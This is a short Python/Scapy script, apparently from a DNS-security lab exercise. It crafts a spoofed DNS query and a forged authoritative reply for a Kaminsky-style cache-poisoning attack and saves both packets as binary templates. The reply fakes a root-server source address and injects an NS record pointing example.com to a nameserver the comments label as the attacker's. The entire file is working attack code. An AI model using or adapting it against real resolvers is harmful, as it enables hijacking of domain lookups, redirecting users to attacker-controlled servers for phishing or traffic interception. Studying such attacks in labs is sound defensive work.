from scapy.all import *
import string
import random

# random name
name = ''.join(random.sample(string.ascii_letters, 5))+'.example.com' 
print(name)
Qdsec = DNSQR(qname=name)

# query
ip_q  = IP(dst='10.10.10.2',src='10.10.10.1') # dst: dns; src:attacker
udp_q = UDP(dport=53,sport=33333,chksum=0)
dns_q = DNS(id=0xaaaa,qr=0,qdcount=1,ancount=0,nscount=0,arcount=0,qd=Qdsec)
pkt_q= ip_q/udp_q/dns_q

# reply
ip_r = IP(dst='10.10.10.2', src='199.43.135.53', chksum=0)
udp_r = UDP(dport=33333, sport=53, chksum=0)
Anssec = DNSRR(rrname=name, type='A', rdata='1.2.3.4', ttl=259200)
 # The Authority Section
NSsec = DNSRR(rrname='example.com', type='NS', ttl=259200, rdata='ns.ssd.net')
Addsec = DNSRR(rrname='ns.ssd.net', type='A', ttl=259200, rdata='10.10.10.1')
dns_r = DNS(id=0xAAAA, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=1, arcount=1, qd=Qdsec, an=Anssec, ns=NSsec, ar=Addsec)
pkt_r = ip_r/udp_r/dns_r

with open('query.bin','wb')as f:
  f.write(bytes(pkt_q))
with open('reply.bin', 'wb') as f:
  f.write(bytes(pkt_r))
